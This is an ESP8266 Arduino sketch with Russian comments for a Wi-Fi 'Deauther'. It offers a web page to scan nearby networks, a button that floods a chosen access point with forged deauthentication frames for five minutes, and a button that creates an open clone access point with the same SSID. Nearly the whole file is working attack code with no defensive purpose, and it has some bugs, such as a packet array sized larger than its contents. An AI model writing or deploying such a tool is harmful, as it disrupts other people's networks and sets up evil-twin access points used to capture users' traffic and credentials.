#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <Ticker.h>

ESP8266WebServer server(80);

const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
uint8_t deauthPacket[26] = { 
  0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
  0x00, 0x00, 0x01, 0x00
};

Ticker deauthTimer;
bool isDeauthRunning = false;
unsigned long deauthStartTime = 0;
const unsigned long deauthDuration = 300000; // 5 минут

String wifiScanResults;

// Функция отправки пакетов
void sendDeauthPacket(const uint8_t *bssid, int channel) {
  wifi_set_channel(channel);
  memcpy(&deauthPacket[10], bssid, 6); // Источник
  memcpy(&deauthPacket[16], bssid, 6); // BSSID
  for (int i = 0; i < 30; i++) {
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    delay(1);
  }
}

// Таймер отправки пакетов
void deauthLoop(const uint8_t *bssid, int channel) {
  if (millis() - deauthStartTime > deauthDuration) {
    deauthTimer.detach();
    isDeauthRunning = false;
    Serial.println("Деаутентификация завершена");
  } else {
    sendDeauthPacket(bssid, channel);
    Serial.println("Пакет отправлен");
  }
}

// Создание клонированной точки доступа
void createFakeAP(const String &ssid, int channel) {
  WiFi.softAP(ssid.c_str(), "", 1, 0, 8); // Создание точки доступа без пароля
  wifi_set_channel(channel);             // Установка канала
  Serial.println("Клонированная точка доступа создана: " + ssid);
}

// --- Страницы веб-интерфейса ---

// Генерация главной страницы
String buildHtmlPage() {
  String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>ESP-8266</title>";
  html += "<style>body { background-color: #121212; color: white; font-family: Arial; text-align: center; }";
  html += "table { width: 80%; margin: 20px auto; border-collapse: collapse; }";
  html += "th, td { border: 1px solid white; padding: 10px; text-align: center; }";
  html += "button { padding: 10px 20px; font-size: 16px; margin: 10px; background-color: #6200EE; color: white; border: none; cursor: pointer; }";
  html += "button:hover { background-color: #3700B3; }</style></head><body>";
  html += "<h1>ESP8266 Wi-Fi Deauther</h1>";
  html += "<button onclick='scanWifi()'>Сканировать сети</button>";
  html += "<div id='results'></div>";
  html += "<script>";
  html += "function scanWifi() { fetch('/scan').then(response => response.text()).then(data => { document.getElementById('results').innerHTML = data; }); }";
  html += "function deauth(bssid, channel) { fetch(`/deauth?bssid=${bssid}&channel=${channel}`).then(response => response.text()).then(alert); }";
  html += "function cloneAP(ssid, bssid, channel) { fetch(`/clone?ssid=${ssid}&bssid=${bssid}&channel=${channel}`).then(response => response.text()).then(alert); }";
  html += "</script></body></html>";
  return html;
}

// Сканирование сетей
void handleScan() {
  int n = WiFi.scanNetworks();
  wifiScanResults = "<table><tr><th>SSID</th><th>MAC-адрес</th><th>Канал</th><th>Сигнал</th><th>Действия</th></tr>";
  for (int i = 0; i < n; ++i) {
    String bssid = WiFi.BSSIDstr(i);
    int channel = WiFi.channel(i);
    int rssi = WiFi.RSSI(i);
    String ssid = WiFi.SSID(i);
    wifiScanResults += "<tr><td>" + ssid + "</td>";
    wifiScanResults += "<td>" + bssid + "</td>";
    wifiScanResults += "<td>" + String(channel) + "</td>";
    wifiScanResults += "<td>" + String(rssi) + " dBm</td>";
    wifiScanResults += "<td>";
    wifiScanResults += "<button onclick='deauth(\"" + bssid + "\", " + String(channel) + ")'>Deauth</button> ";
    wifiScanResults += "<button onclick='cloneAP(\"" + ssid + "\", \"" + bssid + "\", " + String(channel) + ")'>Clone AP</button>";
    wifiScanResults += "</td></tr>";
  }
  wifiScanResults += "</table>";
  server.send(200, "text/html", wifiScanResults);
}

// Деаутентификация
void handleDeauth() {
  if (server.hasArg("bssid") && server.hasArg("channel")) {
    String bssidStr = server.arg("bssid");
    int channel = server.arg("channel").toInt();

    uint8_t bssid[6];
    sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
           &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);

    deauthStartTime = millis();
    isDeauthRunning = true;

    deauthTimer.attach(1, [=]() { deauthLoop(bssid, channel); });

    server.send(200, "text/plain", "Деаутентификация началась");
  } else {
    server.send(400, "text/plain", "Ошибка: отсутствуют параметры");
  }
}

// Клонирование точки доступа
void handleCloneAP() {
  if (server.hasArg("ssid") && server.hasArg("bssid") && server.hasArg("channel")) {
    String ssid = server.arg("ssid");
    int channel = server.arg("channel").toInt();
    createFakeAP(ssid, channel);
    server.send(200, "text/plain", "Клонированная точка доступа создана: " + ssid);
  } else {
    server.send(400, "text/plain", "Ошибка: отсутствуют параметры");
  }
}

// Главная страница
void handleRoot() {
  server.send(200, "text/html", buildHtmlPage());
}

// Настройка
void setup() {
  WiFi.softAP("ESP-WiFi", "11111111");
  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/deauth", handleDeauth);
  server.on("/clone", handleCloneAP);
  server.begin();
  Serial.begin(115200);
}

void loop() {
  server.handleClient();
}

